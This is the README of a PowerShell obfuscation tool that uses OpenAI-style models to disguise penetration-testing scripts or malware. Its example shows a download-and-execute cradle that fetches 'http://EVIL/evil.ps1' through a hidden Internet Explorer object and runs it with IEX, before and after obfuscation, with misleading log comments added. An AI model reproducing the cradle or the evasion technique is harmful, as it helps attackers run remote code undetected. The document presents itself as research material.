# Invoke-GPTObfuscation
Invoke-GPTObfuscation is a PowerShell Obfuscator that utilizes OpenAI or compatible text-completion models to obfuscate your PowerShell penetration testing code, malware, or any other sensitive script. For Educational & Research purposes only.

This is mostly demonstrational, and will frequently create invalid code. You'll need to come up with a better prompt to get good results. If you make any improvements, please consider submitting a pull request!

---

## Credits
### Author: Hunter Watson
### Original Repo: https://github.com/hwvs/Invoke-GPTObfuscation
### License: Mozilla Public License 2.0

---

## Results 

Before:
```powershell
$ie=New-Object -comobject InternetExplorer.Application;
$ie.visible=$False;
$ie.navigate('http://EVIL/evil.ps1');
start-sleep -s 5;
$r=$ie.Document.body.innerHTML;
$ie.quit();
IEX $r
```

After:
```powershell
# generating Log files
$Strawberry = New-Object -CoMObjEcT inTErnETeXPLOreR.Application;
$strawberry.vISiblE = $fAlSe;
$STRaWbeRRy.NAVigatE('HttP://evIl/evil.ps1');
stArT-SlEEp -s 5;

# Updating log directory path
$r = $StrawberrY.DoCument.BoDy.InneRHTML;

# Cleanup
$strawBerRy.quiT();

# Execute payload
IeX $R
```

